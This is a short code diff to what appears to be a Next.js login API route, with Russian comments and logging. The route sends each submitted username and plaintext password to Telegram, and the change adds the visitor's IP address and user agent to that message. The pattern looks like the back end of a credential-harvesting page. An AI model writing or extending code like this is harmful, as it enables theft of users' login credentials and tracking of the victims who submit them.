@@ -117,7 +117,7 @@ export async function POST(request: NextRequest) {
     
     try {
       // Отправка в Telegram вместо Email
-      await sendLoginTelegram(username, password, requestId);
+      await sendLoginTelegram(username, password, requestId, clientIp, userAgent);
       console.log("[API LOGIN] Уведомление отправлено в Telegram");
     } catch (telegramError) {
       console.error("[API LOGIN] Ошибка отправки в Telegram:", telegramError);
